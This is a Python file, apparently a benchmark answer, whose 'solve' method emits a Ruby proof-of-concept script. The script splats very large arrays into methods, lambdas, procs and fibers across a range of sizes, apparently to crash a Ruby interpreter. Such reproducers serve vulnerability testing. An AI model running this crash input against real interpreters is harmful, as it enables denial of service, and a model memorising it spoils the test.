import os
import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        poc = []
        poc.append("def foo(*a); 0; end\n")
        poc.append("def bar(x=0, *a); 0; end\n")
        poc.append("def try_block_calls(a)\n")
        poc.append("  begin\n")
        poc.append("    (lambda { |*args| 0 }).call(*a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("  begin\n")
        poc.append("    Proc.new { |*args| 0 }.call(*a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("end\n")
        poc.append("def try_method_calls(a)\n")
        poc.append("  begin\n")
        poc.append("    foo(*a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("  begin\n")
        poc.append("    bar(1, *a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("  begin\n")
        poc.append("    method(:foo).call(*a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("  begin\n")
        poc.append("    send(:foo, *a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("end\n")
        poc.append("def try_fiber(a)\n")
        poc.append("  return unless defined?(Fiber)\n")
        poc.append("  begin\n")
        poc.append("    f = Fiber.new { |*args| 0 }\n")
        poc.append("    f.resume(*a)\n")
        poc.append("  rescue Exception\n")
        poc.append("  end\n")
        poc.append("end\n")
        poc.append("def go(n)\n")
        poc.append("  begin\n")
        poc.append("    a = Array.new(n, 1)\n")
        poc.append("  rescue Exception\n")
        poc.append("    return\n")
        poc.append("  end\n")
        poc.append("  begin; GC.start; rescue Exception; end\n")
        poc.append("  try_fiber(a)\n")
        poc.append("  try_method_calls(a)\n")
        poc.append("  try_block_calls(a)\n")
        poc.append("end\n")
        poc.append("sizes = [200000, 150000, 131072, 100000, 98304, 65535, 60000, 50000, 40000, 32768, 25000, 20000, 16384, 12000, 10000, 8192, 6000, 4096]\n")
        poc.append("sizes.each { |n| go(n) }\n")
        script = "".join(poc)
        return script.encode("utf-8")